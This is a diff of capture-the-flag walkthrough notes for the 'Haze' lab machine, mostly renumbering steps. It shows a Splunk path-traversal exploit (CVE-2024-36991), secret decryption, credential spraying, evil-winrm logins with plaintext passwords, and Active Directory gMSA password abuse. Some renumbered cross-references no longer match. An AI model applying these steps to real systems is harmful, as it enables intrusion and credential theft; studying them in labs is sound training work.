@@ -1,10 +1,10 @@
 VPN 10.10.11.61
 
-**1.**INFO: Add IP to hosts file
+**1.** INFO: Add IP to hosts file
 
 **RUN:** **sudo nano /etc/hosts**
 
-**2.**INFO: nmap
+**2.** INFO: nmap
 
 **RUN:** **sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt
 haze.htb**
@@ -22,7 +22,7 @@ haze.htb**
 
 **RUN:** **sudo nano /etc/hosts**
 
-**4.**INFO: SPLUNK PORT 8000 opens in FIREFOX http://haze.htb:8000.
+**4.** INFO: SPLUNK PORT 8000 opens in FIREFOX http://haze.htb:8000.
 
 NEXT: [Tried **http** and **https** on all SPLUNK PORTS]{.mark}
 
@@ -34,14 +34,14 @@ NEXT: [Tried **http** and **https** on all SPLUNK PORTS]{.mark}
 
 ![](images/media/image4.png)
 
-**5.**INFO: Googled for SPLUNK POC. FOUND:
+**5.** INFO: Googled for SPLUNK POC. FOUND:
 <https://github.com/bigb0x/CVE-2024-36991>
 
 \- Downloaded FILE **CVE-2024-36991.py**
 
 ![](images/media/image5.png)
 
-**6.**INFO: Found Users with PASSWORD HASHES
+**6.** INFO: Found Users with PASSWORD HASHES
 
 **TOOL-EXPLANATION:**
 
@@ -64,7 +64,7 @@ http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd
 The \$6\$ prefix specifically indicates that the password hash uses the
 **SHA-512** algorithm.
 
-**7.**INFO:
+**7.** INFO:
 <https://www.sonicwall.com/blog/critical-splunk-vulnerability-cve-2024-36991-patch-now-to-prevent-arbitrary-file-reads>
 
 ![](images/media/image8.png)
@@ -78,7 +78,7 @@ Files\\Splunk
 
 <https://docs.splunk.com/Documentation/Splunk/9.4.2/Installation/InstallonWindowsviathecommandline>
 
-**8.**INFO: Captured authentication.conf through Terminal
+**8.** INFO: Captured authentication.conf through Terminal
 **https://github.com/HurricaneLabs/splunksecrets**
 
 **Both paths work**
@@ -98,12 +98,12 @@ http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/s
 
 ![](images/media/image11.png)
 
-**9.**INFO: Download splunksecrects.py
+**9.** INFO: Download splunksecrects.py
 <https://github.com/HurricaneLabs/splunksecrets.git>
 
 ![](images/media/image12.png)
 
-**10.**INFO: Splunksecrets-tool: Get password
+**10.** INFO: Splunksecrets-tool: Get password
 
 **-** 1^st^ **create splunk_secret.txt** and **paste the found PASSWORD
 HASH from STEP 8** in it.
@@ -132,7 +132,7 @@ variable directly in your current terminal session:
 splunk_secret.txt \--ciphertext
 \'\$7\$ndnVlcPhF4lQgPhPu7Yz1pvGm66NkoPPyCLn+qt1qyojs4QU+hkteemWQGuuTKDVlwB08pY=\'**
 
-**11.**INFO: Take **USER** from **STEP 8** and **PASSWORD** from **STEP
+**11.** INFO: Take **USER** from **STEP 8** and **PASSWORD** from **STEP
 10**
 
 **RUN:** **crackmapexec smb haze.htb -u \"paul.taylor\" -p
@@ -170,7 +170,7 @@ it.
 
 ![](images/media/image18.png)
 
-**14.**INFO: Download JSON-files (in this case JSON-files are located in
+**13.** INFO: Download JSON-files (in this case JSON-files are located in
 ZIP-file)
 
 **RUN:** **bloodhound-python -u \'mark.adams\' -p
@@ -192,7 +192,7 @@ issue.
 
 ![](images/media/image20.png)
 
-**15.**INFO: Start
+**14.** INFO: Start
 
 **RUN: sudo neo4j console (This starts the service)**
 
@@ -205,7 +205,7 @@ STEPS in CERTIFIED VM)
 
 **User:** neo4j **Password:** as163452
 
-**15.1** INFO: Search for USER mark.adams
+**15.** INFO: Search for USER mark.adams
 
 FOUND: USER mark.adams is MEMBER of <GMSA_MANAGERS@HAZE.HTB>
 
@@ -215,7 +215,7 @@ FOUND: USER mark.adams is MEMBER of <GMSA_MANAGERS@HAZE.HTB>
 
 **https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword**
 
-**15.2** INFO: Try reading the Password
+**15.1** INFO: Try reading the Password
 
 **Download:
 https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py**
@@ -231,19 +231,19 @@ https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py**
 
 **IMPORTANT: GMSA is not a GROUP, but a SPECIAL ACCOUNT TYPE**
 
-**15.3** INFO: Try POWERSHELL WinRM login with mark.adams
+**15.2** INFO: Try POWERSHELL WinRM login with mark.adams
 
 **RUN:** **evil-winrm -i 10.10.11.61 -u mark.adams -p
 Ld@p_Auth_Sp1unk@2k24**
 
-**15.4** INFO: Check Account type of **Haze-IT-Backup\$**
+**15.3** INFO: Check Account type of **Haze-IT-Backup\$**
 
 **RUN loggedin on POWERSHELL:** **Get-ADServiceAccount -Identity
 Haze-IT-Backup\$ \| Select-Object Name, ObjectClass**
 
 ![](images/media/image23.png)
 
-**15.5** INFO: Who has permission to see his password, ONLY DOMAIN
+**15.4** INFO: Who has permission to see his password, ONLY DOMAIN
 ADMINS!
 
 **By running this command, you can see which users, groups, or computers
@@ -256,7 +256,7 @@ PrincipalsAllowedToRetrieveManagedPassword**
 
 ![](images/media/image24.png)
 
-**15.6** INFO: Mark.adams belongs to GMSA administrator group. Try to
+**15.5** INFO: Mark.adams belongs to GMSA administrator group. Try to
 mod the READABLE USER
 
 **IMPORTANT: All commands, STEPS 15.6 & 15.7 have to be DONE FAST,
@@ -273,7 +273,7 @@ PrincipalsAllowedToRetrieveManagedPassword**
 
 ![](images/media/image25.png)
 
-**15.7** INFO: Try reading Password, see STEP 15.2
+**15.6** INFO: Try reading Password, see STEP 15.2
 
 **IMPORTANT: This command has to been run, so that STEP 19.1 works
 out**
@@ -299,7 +299,7 @@ can be modified to get the PASSWORD HASH of the BACKUP
 
 **https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership**
 
-**18. INFO: Take the 1^st^ HASH of STEP 15.7 for the following
+**18.** INFO: Take the 1^st^ HASH of STEP 15.7 for the following
 command**
 
 INFO: Get JSON-files 2^nd^ time
